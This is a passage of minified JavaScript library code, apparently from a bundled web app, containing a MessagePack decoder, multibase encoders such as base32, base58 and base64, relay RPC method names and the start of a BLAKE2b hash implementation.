            else if (U === 215)
                Z = this.decodeExtension(8, 0);
            else if (U === 216)
                Z = this.decodeExtension(16, 0);
            else if (U === 199) {
                const et = this.lookU8();
                Z = this.decodeExtension(et, 1)
            } else if (U === 200) {
                const et = this.lookU16();
                Z = this.decodeExtension(et, 2)
            } else if (U === 201) {
                const et = this.lookU32();
                Z = this.decodeExtension(et, 4)
            } else
                throw new DecodeError(`Unrecognized type byte: ${prettyByte(U)}`);
            this.complete();
            const oe = this.stack;
            for (; oe.length > 0; ) {
                const et = oe.top();
                if (et.type === STATE_ARRAY)
                    if (et.array[et.position] = Z,
                    et.position++,
                    et.position === et.size)
                        Z = et.array,
                        oe.release(et);
                    else
                        continue e;
                else if (et.type === STATE_MAP_KEY) {
                    if (Z === "__proto__")
                        throw new DecodeError("The key __proto__ is not allowed");
                    et.key = this.mapKeyConverter(Z),
                    et.type = STATE_MAP_VALUE;
                    continue e
                } else if (et.map[et.key] = Z,
                et.readCount++,
                et.readCount === et.size)
                    Z = et.map,
                    oe.release(et);
                else {
                    et.key = null,
                    et.type = STATE_MAP_KEY;
                    continue e
                }
            }
            return Z
        }
    }
    readHeadByte() {
        return this.headByte === HEAD_BYTE_REQUIRED && (this.headByte = this.readU8()),
        this.headByte
    }
    complete() {
        this.headByte = HEAD_BYTE_REQUIRED
    }
    readArraySize() {
        const U = this.readHeadByte();
        switch (U) {
        case 220:
            return this.readU16();
        case 221:
            return this.readU32();
        default:
            {
                if (U < 160)
                    return U - 144;
                throw new DecodeError(`Unrecognized array type byte: ${prettyByte(U)}`)
            }
        }
    }
    pushMapState(U) {
        if (U > this.maxMapLength)
            throw new DecodeError(`Max length exceeded: map length (${U}) > maxMapLengthLength (${this.maxMapLength})`);
        this.stack.pushMapState(U)
    }
    pushArrayState(U) {
        if (U > this.maxArrayLength)
            throw new DecodeError(`Max length exceeded: array length (${U}) > maxArrayLength (${this.maxArrayLength})`);
        this.stack.pushArrayState(U)
    }
    decodeString(U, Z) {
        return !this.rawStrings || this.stateIsMapKey() ? this.decodeUtf8String(U, Z) : this.decodeBinary(U, Z)
    }
    decodeUtf8String(U, Z) {
        var st;
        if (U > this.maxStrLength)
            throw new DecodeError(`Max length exceeded: UTF-8 byte length (${U}) > maxStrLength (${this.maxStrLength})`);
        if (this.bytes.byteLength < this.pos + Z + U)
            throw MORE_DATA;
        const oe = this.pos + Z;
        let et;
        return this.stateIsMapKey() && ((st = this.keyDecoder) != null && st.canBeCached(U)) ? et = this.keyDecoder.decode(this.bytes, oe, U) : et = utf8Decode(this.bytes, oe, U),
        this.pos += Z + U,
        et
    }
    stateIsMapKey() {
        return this.stack.length > 0 ? this.stack.top().type === STATE_MAP_KEY : !1
    }
    decodeBinary(U, Z) {
        if (U > this.maxBinLength)
            throw new DecodeError(`Max length exceeded: bin length (${U}) > maxBinLength (${this.maxBinLength})`);
        if (!this.hasRemaining(U + Z))
            throw MORE_DATA;
        const oe = this.pos + Z
          , et = this.bytes.subarray(oe, oe + U);
        return this.pos += Z + U,
        et
    }
    decodeExtension(U, Z) {
        if (U > this.maxExtLength)
            throw new DecodeError(`Max length exceeded: ext length (${U}) > maxExtLength (${this.maxExtLength})`);
        const oe = this.view.getInt8(this.pos + Z)
          , et = this.decodeBinary(U, Z + 1);
        return this.extensionCodec.decode(et, oe, this.context)
    }
    lookU8() {
        return this.view.getUint8(this.pos)
    }
    lookU16() {
        return this.view.getUint16(this.pos)
    }
    lookU32() {
        return this.view.getUint32(this.pos)
    }
    readU8() {
        const U = this.view.getUint8(this.pos);
        return this.pos++,
        U
    }
    readI8() {
        const U = this.view.getInt8(this.pos);
        return this.pos++,
        U
    }
    readU16() {
        const U = this.view.getUint16(this.pos);
        return this.pos += 2,
        U
    }
    readI16() {
        const U = this.view.getInt16(this.pos);
        return this.pos += 2,
        U
    }
    readU32() {
        const U = this.view.getUint32(this.pos);
        return this.pos += 4,
        U
    }
    readI32() {
        const U = this.view.getInt32(this.pos);
        return this.pos += 4,
        U
    }
    readU64() {
        const U = getUint64(this.view, this.pos);
        return this.pos += 8,
        U
    }
    readI64() {
        const U = getInt64(this.view, this.pos);
        return this.pos += 8,
        U
    }
    readU64AsBigInt() {
        const U = this.view.getBigUint64(this.pos);
        return this.pos += 8,
        U
    }
    readI64AsBigInt() {
        const U = this.view.getBigInt64(this.pos);
        return this.pos += 8,
        U
    }
    readF32() {
        const U = this.view.getFloat32(this.pos);
        return this.pos += 4,
        U
    }
    readF64() {
        const U = this.view.getFloat64(this.pos);
        return this.pos += 8,
        U
    }
}
;
function decode$2(q, U) {
    return new Decoder$1(U).decode(q)
}
/*! scure-base - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function isBytes(q) {
    return q instanceof Uint8Array || ArrayBuffer.isView(q) && q.constructor.name === "Uint8Array"
}
function isArrayOf(q, U) {
    return Array.isArray(U) ? U.length === 0 ? !0 : q ? U.every(Z => typeof Z == "string") : U.every(Z => Number.isSafeInteger(Z)) : !1
}
function astr(q, U) {
    if (typeof U != "string")
        throw new Error(`${q}: string expected`);
    return !0
}
function anumber(q) {
    if (!Number.isSafeInteger(q))
        throw new Error(`invalid integer: ${q}`)
}
function aArr(q) {
    if (!Array.isArray(q))
        throw new Error("array expected")
}
function astrArr(q, U) {
    if (!isArrayOf(!0, U))
        throw new Error(`${q}: array of strings expected`)
}
function anumArr(q, U) {
    if (!isArrayOf(!1, U))
        throw new Error(`${q}: array of numbers expected`)
}
function chain(...q) {
    const U = st => st
      , Z = (st, ws) => ms => st(ws(ms))
      , oe = q.map(st => st.encode).reduceRight(Z, U)
      , et = q.map(st => st.decode).reduce(Z, U);
    return {
        encode: oe,
        decode: et
    }
}
function alphabet$1(q) {
    const U = typeof q == "string" ? q.split("") : q
      , Z = U.length;
    astrArr("alphabet", U);
    const oe = new Map(U.map( (et, st) => [et, st]));
    return {
        encode: et => (aArr(et),
        et.map(st => {
            if (!Number.isSafeInteger(st) || st < 0 || st >= Z)
                throw new Error(`alphabet.encode: digit index outside alphabet "${st}". Allowed: ${q}`);
            return U[st]
        }
        )),
        decode: et => (aArr(et),
        et.map(st => {
            astr("alphabet.decode", st);
            const ws = oe.get(st);
            if (ws === void 0)
                throw new Error(`Unknown letter: "${st}". Allowed: ${q}`);
            return ws
        }
        ))
    }
}
function join(q="") {
    return astr("join", q),
    {
        encode: U => (astrArr("join.decode", U),
        U.join(q)),
        decode: U => (astr("join.decode", U),
        U.split(q))
    }
}
function padding(q, U="=") {
    return anumber(q),
    astr("padding", U),
    {
        encode(Z) {
            for (astrArr("padding.encode", Z); Z.length * q % 8; )
                Z.push(U);
            return Z
        },
        decode(Z) {
            astrArr("padding.decode", Z);
            let oe = Z.length;
            if (oe * q % 8)
                throw new Error("padding: invalid, string should have whole number of bytes");
            for (; oe > 0 && Z[oe - 1] === U; oe--)
                if ((oe - 1) * q % 8 === 0)
                    throw new Error("padding: invalid, string has too much padding");
            return Z.slice(0, oe)
        }
    }
}
const gcd = (q, U) => U === 0 ? q : gcd(U, q % U)
  , radix2carry = (q, U) => q + (U - gcd(q, U))
  , powers = ( () => {
    let q = [];
    for (let U = 0; U < 40; U++)
        q.push(2 ** U);
    return q
}
)();
function convertRadix2(q, U, Z, oe) {
    if (aArr(q),
    U <= 0 || U > 32)
        throw new Error(`convertRadix2: wrong from=${U}`);
    if (Z <= 0 || Z > 32)
        throw new Error(`convertRadix2: wrong to=${Z}`);
    if (radix2carry(U, Z) > 32)
        throw new Error(`convertRadix2: carry overflow from=${U} to=${Z} carryBits=${radix2carry(U, Z)}`);
    let et = 0
      , st = 0;
    const ws = powers[U]
      , ms = powers[Z] - 1
      , Es = [];
    for (const vs of q) {
        if (anumber(vs),
        vs >= ws)
            throw new Error(`convertRadix2: invalid data word=${vs} from=${U}`);
        if (et = et << U | vs,
        st + U > 32)
            throw new Error(`convertRadix2: carry overflow pos=${st} from=${U}`);
        for (st += U; st >= Z; st -= Z)
            Es.push((et >> st - Z & ms) >>> 0);
        const _s = powers[st];
        if (_s === void 0)
            throw new Error("invalid carry");
        et &= _s - 1
    }
    if (et = et << Z - st & ms,
    !oe && st >= U)
        throw new Error("Excess padding");
    if (!oe && et > 0)
        throw new Error(`Non-zero padding: ${et}`);
    return oe && st > 0 && Es.push(et >>> 0),
    Es
}
function radix2(q, U=!1) {
    if (anumber(q),
    q <= 0 || q > 32)
        throw new Error("radix2: bits should be in (0..32]");
    if (radix2carry(8, q) > 32 || radix2carry(q, 8) > 32)
        throw new Error("radix2: carry overflow");
    return {
        encode: Z => {
            if (!isBytes(Z))
                throw new Error("radix2.encode input should be Uint8Array");
            return convertRadix2(Array.from(Z), 8, q, !U)
        }
        ,
        decode: Z => (anumArr("radix2.decode", Z),
        Uint8Array.from(convertRadix2(Z, q, 8, U)))
    }
}
const base32$2 = chain(radix2(5), alphabet$1("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"), padding(5), join(""));
function asUint8Array(q) {
    return globalThis.Buffer != null ? new Uint8Array(q.buffer,q.byteOffset,q.byteLength) : q
}
function allocUnsafe(q=0) {
    return globalThis.Buffer != null && globalThis.Buffer.allocUnsafe != null ? asUint8Array(globalThis.Buffer.allocUnsafe(q)) : new Uint8Array(q)
}
function concat(q, U) {
    U || (U = q.reduce( (et, st) => et + st.length, 0));
    const Z = allocUnsafe(U);
    let oe = 0;
    for (const et of q)
        Z.set(et, oe),
        oe += et.length;
    return asUint8Array(Z)
}
function base(q, U) {
    if (q.length >= 255)
        throw new TypeError("Alphabet too long");
    for (var Z = new Uint8Array(256), oe = 0; oe < Z.length; oe++)
        Z[oe] = 255;
    for (var et = 0; et < q.length; et++) {
        var st = q.charAt(et)
          , ws = st.charCodeAt(0);
        if (Z[ws] !== 255)
            throw new TypeError(st + " is ambiguous");
        Z[ws] = et
    }
    var ms = q.length
      , Es = q.charAt(0)
      , vs = Math.log(ms) / Math.log(256)
      , _s = Math.log(256) / Math.log(ms);
    function Is(Rs) {
        if (Rs instanceof Uint8Array || (ArrayBuffer.isView(Rs) ? Rs = new Uint8Array(Rs.buffer,Rs.byteOffset,Rs.byteLength) : Array.isArray(Rs) && (Rs = Uint8Array.from(Rs))),
        !(Rs instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (Rs.length === 0)
            return "";
        for (var Ns = 0, Hs = 0, ha = 0, pa = Rs.length; ha !== pa && Rs[ha] === 0; )
            ha++,
            Ns++;
        for (var Zs = (pa - ha) * _s + 1 >>> 0, Qa = new Uint8Array(Zs); ha !== pa; ) {
            for (var Ga = Rs[ha], nl = 0, sl = Zs - 1; (Ga !== 0 || nl < Hs) && sl !== -1; sl--,
            nl++)
                Ga += 256 * Qa[sl] >>> 0,
                Qa[sl] = Ga % ms >>> 0,
                Ga = Ga / ms >>> 0;
            if (Ga !== 0)
                throw new Error("Non-zero carry");
            Hs = nl,
            ha++
        }
        for (var el = Zs - Hs; el !== Zs && Qa[el] === 0; )
            el++;
        for (var Bs = Es.repeat(Ns); el < Zs; ++el)
            Bs += q.charAt(Qa[el]);
        return Bs
    }
    function Ss(Rs) {
        if (typeof Rs != "string")
            throw new TypeError("Expected String");
        if (Rs.length === 0)
            return new Uint8Array;
        var Ns = 0;
        if (Rs[Ns] !== " ") {
            for (var Hs = 0, ha = 0; Rs[Ns] === Es; )
                Hs++,
                Ns++;
            for (var pa = (Rs.length - Ns) * vs + 1 >>> 0, Zs = new Uint8Array(pa); Rs[Ns]; ) {
                var Qa = Z[Rs.charCodeAt(Ns)];
                if (Qa === 255)
                    return;
                for (var Ga = 0, nl = pa - 1; (Qa !== 0 || Ga < ha) && nl !== -1; nl--,
                Ga++)
                    Qa += ms * Zs[nl] >>> 0,
                    Zs[nl] = Qa % 256 >>> 0,
                    Qa = Qa / 256 >>> 0;
                if (Qa !== 0)
                    throw new Error("Non-zero carry");
                ha = Ga,
                Ns++
            }
            if (Rs[Ns] !== " ") {
                for (var sl = pa - ha; sl !== pa && Zs[sl] === 0; )
                    sl++;
                for (var el = new Uint8Array(Hs + (pa - sl)), Bs = Hs; sl !== pa; )
                    el[Bs++] = Zs[sl++];
                return el
            }
        }
    }
    function Ts(Rs) {
        var Ns = Ss(Rs);
        if (Ns)
            return Ns;
        throw new Error(`Non-${U} character`)
    }
    return {
        encode: Is,
        decodeUnsafe: Ss,
        decode: Ts
    }
}
var src = base
  , _brrp__multiformats_scope_baseX = src;
const coerce = q => {
    if (q instanceof Uint8Array && q.constructor.name === "Uint8Array")
        return q;
    if (q instanceof ArrayBuffer)
        return new Uint8Array(q);
    if (ArrayBuffer.isView(q))
        return new Uint8Array(q.buffer,q.byteOffset,q.byteLength);
    throw new Error("Unknown type, must be binary type")
}
  , fromString$1 = q => new TextEncoder().encode(q)
  , toString$1 = q => new TextDecoder().decode(q);
class Encoder {
    constructor(U, Z, oe) {
        this.name = U,
        this.prefix = Z,
        this.baseEncode = oe
    }
    encode(U) {
        if (U instanceof Uint8Array)
            return `${this.prefix}${this.baseEncode(U)}`;
        throw Error("Unknown type, must be binary type")
    }
}
class Decoder {
    constructor(U, Z, oe) {
        if (this.name = U,
        this.prefix = Z,
        Z.codePointAt(0) === void 0)
            throw new Error("Invalid prefix character");
        this.prefixCodePoint = Z.codePointAt(0),
        this.baseDecode = oe
    }
    decode(U) {
        if (typeof U == "string") {
            if (U.codePointAt(0) !== this.prefixCodePoint)
                throw Error(`Unable to decode multibase string ${JSON.stringify(U)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);
            return this.baseDecode(U.slice(this.prefix.length))
        } else
            throw Error("Can only multibase decode strings")
    }
    or(U) {
        return or$2(this, U)
    }
}
class ComposedDecoder {
    constructor(U) {
        this.decoders = U
    }
    or(U) {
        return or$2(this, U)
    }
    decode(U) {
        const Z = U[0]
          , oe = this.decoders[Z];
        if (oe)
            return oe.decode(U);
        throw RangeError(`Unable to decode multibase string ${JSON.stringify(U)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)
    }
}
const or$2 = (q, U) => new ComposedDecoder({
    ...q.decoders || {
        [q.prefix]: q
    },
    ...U.decoders || {
        [U.prefix]: U
    }
});
class Codec {
    constructor(U, Z, oe, et) {
        this.name = U,
        this.prefix = Z,
        this.baseEncode = oe,
        this.baseDecode = et,
        this.encoder = new Encoder(U,Z,oe),
        this.decoder = new Decoder(U,Z,et)
    }
    encode(U) {
        return this.encoder.encode(U)
    }
    decode(U) {
        return this.decoder.decode(U)
    }
}
const from = ({name: q, prefix: U, encode: Z, decode: oe}) => new Codec(q,U,Z,oe)
  , baseX = ({prefix: q, name: U, alphabet: Z}) => {
    const {encode: oe, decode: et} = _brrp__multiformats_scope_baseX(Z, U);
    return from({
        prefix: q,
        name: U,
        encode: oe,
        decode: st => coerce(et(st))
    })
}
  , decode$1 = (q, U, Z, oe) => {
    const et = {};
    for (let _s = 0; _s < U.length; ++_s)
        et[U[_s]] = _s;
    let st = q.length;
    for (; q[st - 1] === "="; )
        --st;
    const ws = new Uint8Array(st * Z / 8 | 0);
    let ms = 0
      , Es = 0
      , vs = 0;
    for (let _s = 0; _s < st; ++_s) {
        const Is = et[q[_s]];
        if (Is === void 0)
            throw new SyntaxError(`Non-${oe} character`);
        Es = Es << Z | Is,
        ms += Z,
        ms >= 8 && (ms -= 8,
        ws[vs++] = 255 & Es >> ms)
    }
    if (ms >= Z || 255 & Es << 8 - ms)
        throw new SyntaxError("Unexpected end of data");
    return ws
}
  , encode$1 = (q, U, Z) => {
    const oe = U[U.length - 1] === "="
      , et = (1 << Z) - 1;
    let st = ""
      , ws = 0
      , ms = 0;
    for (let Es = 0; Es < q.length; ++Es)
        for (ms = ms << 8 | q[Es],
        ws += 8; ws > Z; )
            ws -= Z,
            st += U[et & ms >> ws];
    if (ws && (st += U[et & ms << Z - ws]),
    oe)
        for (; st.length * Z & 7; )
            st += "=";
    return st
}
  , rfc4648 = ({name: q, prefix: U, bitsPerChar: Z, alphabet: oe}) => from({
    prefix: U,
    name: q,
    encode(et) {
        return encode$1(et, oe, Z)
    },
    decode(et) {
        return decode$1(et, oe, Z, q)
    }
})
  , identity = from({
    prefix: "\0",
    name: "identity",
    encode: q => toString$1(q),
    decode: q => fromString$1(q)
})
  , identityBase = Object.freeze(Object.defineProperty({
    __proto__: null,
    identity
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base2 = rfc4648({
    prefix: "0",
    name: "base2",
    alphabet: "01",
    bitsPerChar: 1
})
  , base2$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base2
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base8 = rfc4648({
    prefix: "7",
    name: "base8",
    alphabet: "01234567",
    bitsPerChar: 3
})
  , base8$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base8
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base10 = baseX({
    prefix: "9",
    name: "base10",
    alphabet: "0123456789"
})
  , base10$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base10
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base16 = rfc4648({
    prefix: "f",
    name: "base16",
    alphabet: "0123456789abcdef",
    bitsPerChar: 4
})
  , base16upper = rfc4648({
    prefix: "F",
    name: "base16upper",
    alphabet: "0123456789ABCDEF",
    bitsPerChar: 4
})
  , base16$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base16,
    base16upper
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base32 = rfc4648({
    prefix: "b",
    name: "base32",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567",
    bitsPerChar: 5
})
  , base32upper = rfc4648({
    prefix: "B",
    name: "base32upper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    bitsPerChar: 5
})
  , base32pad = rfc4648({
    prefix: "c",
    name: "base32pad",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
    bitsPerChar: 5
})
  , base32padupper = rfc4648({
    prefix: "C",
    name: "base32padupper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
    bitsPerChar: 5
})
  , base32hex = rfc4648({
    prefix: "v",
    name: "base32hex",
    alphabet: "0123456789abcdefghijklmnopqrstuv",
    bitsPerChar: 5
})
  , base32hexupper = rfc4648({
    prefix: "V",
    name: "base32hexupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
    bitsPerChar: 5
})
  , base32hexpad = rfc4648({
    prefix: "t",
    name: "base32hexpad",
    alphabet: "0123456789abcdefghijklmnopqrstuv=",
    bitsPerChar: 5
})
  , base32hexpadupper = rfc4648({
    prefix: "T",
    name: "base32hexpadupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
    bitsPerChar: 5
})
  , base32z = rfc4648({
    prefix: "h",
    name: "base32z",
    alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
    bitsPerChar: 5
})
  , base32$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base32,
    base32hex,
    base32hexpad,
    base32hexpadupper,
    base32hexupper,
    base32pad,
    base32padupper,
    base32upper,
    base32z
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base36 = baseX({
    prefix: "k",
    name: "base36",
    alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
})
  , base36upper = baseX({
    prefix: "K",
    name: "base36upper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
})
  , base36$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base36,
    base36upper
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base58btc = baseX({
    name: "base58btc",
    prefix: "z",
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
})
  , base58flickr = baseX({
    name: "base58flickr",
    prefix: "Z",
    alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
})
  , base58 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base58btc,
    base58flickr
}, Symbol.toStringTag, {
    value: "Module"
}))
  , base64 = rfc4648({
    prefix: "m",
    name: "base64",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    bitsPerChar: 6
})
  , base64pad = rfc4648({
    prefix: "M",
    name: "base64pad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    bitsPerChar: 6
})
  , base64url = rfc4648({
    prefix: "u",
    name: "base64url",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
    bitsPerChar: 6
})
  , base64urlpad = rfc4648({
    prefix: "U",
    name: "base64urlpad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
    bitsPerChar: 6
})
  , base64$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base64,
    base64pad,
    base64url,
    base64urlpad
}, Symbol.toStringTag, {
    value: "Module"
}))
  , alphabet = Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂")
  , alphabetBytesToChars = alphabet.reduce( (q, U, Z) => (q[Z] = U,
q), [])
  , alphabetCharsToBytes = alphabet.reduce( (q, U, Z) => (q[U.codePointAt(0)] = Z,
q), []);
function encode(q) {
    return q.reduce( (U, Z) => (U += alphabetBytesToChars[Z],
    U), "")
}
function decode(q) {
    const U = [];
    for (const Z of q) {
        const oe = alphabetCharsToBytes[Z.codePointAt(0)];
        if (oe === void 0)
            throw new Error(`Non-base256emoji character: ${Z}`);
        U.push(oe)
    }
    return new Uint8Array(U)
}
const base256emoji = from({
    prefix: "🚀",
    name: "base256emoji",
    encode,
    decode
})
  , base256emoji$1 = Object.freeze(Object.defineProperty({
    __proto__: null,
    base256emoji
}, Symbol.toStringTag, {
    value: "Module"
}));
new TextEncoder;
new TextDecoder;
const bases = {
    ...identityBase,
    ...base2$1,
    ...base8$1,
    ...base10$1,
    ...base16$1,
    ...base32$1,
    ...base36$1,
    ...base58,
    ...base64$1,
    ...base256emoji$1
};
function createCodec(q, U, Z, oe) {
    return {
        name: q,
        prefix: U,
        encoder: {
            name: q,
            prefix: U,
            encode: Z
        },
        decoder: {
            decode: oe
        }
    }
}
const string = createCodec("utf8", "u", q => "u" + new TextDecoder("utf8").decode(q), q => new TextEncoder().encode(q.substring(1)))
  , ascii = createCodec("ascii", "a", q => {
    let U = "a";
    for (let Z = 0; Z < q.length; Z++)
        U += String.fromCharCode(q[Z]);
    return U
}
, q => {
    q = q.substring(1);
    const U = allocUnsafe(q.length);
    for (let Z = 0; Z < q.length; Z++)
        U[Z] = q.charCodeAt(Z);
    return U
}
)
  , BASES = {
    utf8: string,
    "utf-8": string,
    hex: bases.base16,
    latin1: ascii,
    ascii,
    binary: ascii,
    ...bases
};
function fromString(q, U="utf8") {
    const Z = BASES[U];
    if (!Z)
        throw new Error(`Unsupported encoding "${U}"`);
    return (U === "utf8" || U === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? asUint8Array(globalThis.Buffer.from(q, "utf-8")) : Z.decoder.decode(`${Z.prefix}${q}`)
}
function toString(q, U="utf8") {
    const Z = BASES[U];
    if (!Z)
        throw new Error(`Unsupported encoding "${U}"`);
    return (U === "utf8" || U === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? globalThis.Buffer.from(q.buffer, q.byteOffset, q.byteLength).toString("utf8") : Z.encoder.encode(q).substring(1)
}
const C$1 = {
    waku: {
        publish: "waku_publish",
        batchPublish: "waku_batchPublish",
        subscribe: "waku_subscribe",
        batchSubscribe: "waku_batchSubscribe",
        subscription: "waku_subscription",
        unsubscribe: "waku_unsubscribe",
        batchUnsubscribe: "waku_batchUnsubscribe",
        batchFetchMessages: "waku_batchFetchMessages"
    },
    irn: {
        publish: "irn_publish",
        batchPublish: "irn_batchPublish",
        subscribe: "irn_subscribe",
        batchSubscribe: "irn_batchSubscribe",
        subscription: "irn_subscription",
        unsubscribe: "irn_unsubscribe",
        batchUnsubscribe: "irn_batchUnsubscribe",
        batchFetchMessages: "irn_batchFetchMessages"
    },
    iridium: {
        publish: "iridium_publish",
        batchPublish: "iridium_batchPublish",
        subscribe: "iridium_subscribe",
        batchSubscribe: "iridium_batchSubscribe",
        subscription: "iridium_subscription",
        unsubscribe: "iridium_unsubscribe",
        batchUnsubscribe: "iridium_batchUnsubscribe",
        batchFetchMessages: "iridium_batchFetchMessages"
    }
}
  , ERROR_MSG_INPUT = "Input must be an string, Buffer or Uint8Array";
function normalizeInput(q) {
    let U;
    if (q instanceof Uint8Array)
        U = q;
    else if (typeof q == "string")
        U = new TextEncoder().encode(q);
    else
        throw new Error(ERROR_MSG_INPUT);
    return U
}
function toHex(q) {
    return Array.prototype.map.call(q, function(U) {
        return (U < 16 ? "0" : "") + U.toString(16)
    }).join("")
}
function uint32ToHex(q) {
    return (4294967296 + q).toString(16).substring(1)
}
function debugPrint(q, U, Z) {
    let oe = `
` + q + " = ";
    for (let et = 0; et < U.length; et += 2) {
        if (Z === 32)
            oe += uint32ToHex(U[et]).toUpperCase(),
            oe += " ",
            oe += uint32ToHex(U[et + 1]).toUpperCase();
        else if (Z === 64)
            oe += uint32ToHex(U[et + 1]).toUpperCase(),
            oe += uint32ToHex(U[et]).toUpperCase();
        else
            throw new Error("Invalid size " + Z);
        et % 6 === 4 ? oe += `
` + new Array(q.length + 4).join(" ") : et < U.length - 2 && (oe += " ")
    }
    console.log(oe)
}
function testSpeed(q, U, Z) {
    let oe = new Date().getTime();
    const et = new Uint8Array(U);
    for (let ws = 0; ws < U; ws++)
        et[ws] = ws % 256;
    const st = new Date().getTime();
    console.log("Generated random input in " + (st - oe) + "ms"),
    oe = st;
    for (let ws = 0; ws < Z; ws++) {
        const ms = q(et)
          , Es = new Date().getTime()
          , vs = Es - oe;
        oe = Es,
        console.log("Hashed in " + vs + "ms: " + ms.substring(0, 20) + "..."),
        console.log(Math.round(U / (1 << 20) / (vs / 1e3) * 100) / 100 + " MB PER SECOND")
    }
}
var util$2 = {
    normalizeInput,
    toHex,
    debugPrint,
    testSpeed
};
const util$1 = util$2;
function ADD64AA(q, U, Z) {
    const oe = q[U] + q[Z];
    let et = q[U + 1] + q[Z + 1];
    oe >= 4294967296 && et++,
    q[U] = oe,
    q[U + 1] = et
}
function ADD64AC(q, U, Z, oe) {
    let et = q[U] + Z;
    Z < 0 && (et += 4294967296);
    let st = q[U + 1] + oe;
    et >= 4294967296 && st++,
    q[U] = et,
    q[U + 1] = st
}
function B2B_GET32(q, U) {
    return q[U] ^ q[U + 1] << 8 ^ q[U + 2] << 16 ^ q[U + 3] << 24
}
function B2B_G(q, U, Z, oe, et, st) {
    const ws = m$1[et]
      , ms = m$1[et + 1]
      , Es = m$1[st]
      , vs = m$1[st + 1];
    ADD64AA(v$3, q, U),
    ADD64AC(v$3, q, ws, ms);
    let _s = v$3[oe] ^ v$3[q]
      , Is = v$3[oe + 1] ^ v$3[q + 1];
    v$3[oe] = Is,
    v$3[oe + 1] = _s,
    ADD64AA(v$3, Z, oe),
    _s = v$3[U] ^ v$3[Z],
    Is = v$3[U + 1] ^ v$3[Z + 1],
    v$3[U] = _s >>> 24 ^ Is << 8,
    v$3[U + 1] = Is >>> 24 ^ _s << 8,
    ADD64AA(v$3, q, U),
    ADD64AC(v$3, q, Es, vs),
    _s = v$3[oe] ^ v$3[q],
    Is = v$3[oe + 1] ^ v$3[q + 1],
    v$3[oe] = _s >>> 16 ^ Is << 16,
    v$3[oe + 1] = Is >>> 16 ^ _s << 16,
    ADD64AA(v$3, Z, oe),
    _s = v$3[U] ^ v$3[Z],
    Is = v$3[U + 1] ^ v$3[Z + 1],
    v$3[U] = Is >>> 31 ^ _s << 1,
    v$3[U + 1] = _s >>> 31 ^ Is << 1
}
const BLAKE2B_IV32 = new Uint32Array([4089235720, 1779033703, 2227873595, 3144134277, 4271175723, 1013904242, 1595750129, 2773480762, 2917565137, 1359893119, 725511199, 2600822924, 4215389547, 528734635, 327033209, 1541459225])
